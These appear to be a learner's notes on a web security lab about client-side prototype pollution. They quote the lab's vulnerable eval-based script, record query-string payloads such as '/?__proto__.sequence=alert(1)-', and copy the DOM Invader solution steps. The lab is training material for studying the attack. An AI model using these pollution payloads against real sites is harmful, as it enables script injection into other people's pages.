/*

a) Find a source that you can use to add arbitrary properties to the global Object.prototype.
b) Identify a gadget property that allows you to execute arbitrary JavaScript.
c) Combine these to call alert()


                    -------: Finding a source :-------
1) searchLoggerAlternativs.js

async function searchLogger() {
    // empty object
    window.macros = {};

    // object called manager with params property as the parsed URL query parameters
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

// we may want to pollute the manager.sequence property or macros property of window.macros object via URL


2) testing the URL route, doent pollute the prototype
/?__proto__[foo]=bar
but 
/?__proto__.foo=bar 
//this works


                          -------: Finding a gadget :-------

3)  eval(
    'if(manager && manager.sequence)
    { 
        manager.macro('+manager.sequence+') 
    }'
);

manager.sequence

4) /?__proto__.sequence=alert(1)
// no

/?__proto__.sequence=data:alert(1);
// error

5) /?__proto__.sequence=alert(1)-
// applying breakpoints in the console source tab refreshing and removing breakpoint
// to check what values is being injected




    Load the lab in Burp's built-in browser.

    Enable DOM Invader and enable the prototype pollution option.

    Open the browser DevTools panel and go to the DOM Invader tab and reload the page.

    Observe that DOM Invader has identified a prototype pollution vector in the search property i.e. the query string.

    Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

    When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.

    Observe that DOM Invader has successfully accessed the eval() sink via the sequence gadget.

    Click Exploit. Observe that DOM Invader's auto-generated proof-of-concept doesn't trigger an alert().

    Go back to the previous browser tab and look at the eval() sink again in DOM Invader. Notice that following the closing canary string, a numeric 1 character has been appended to the payload.

    Click Exploit again. In the new tab that loads, append a minus character (-) to the URL and reload the page.

    Observe that the alert(1) is called and the lab is solved.




*/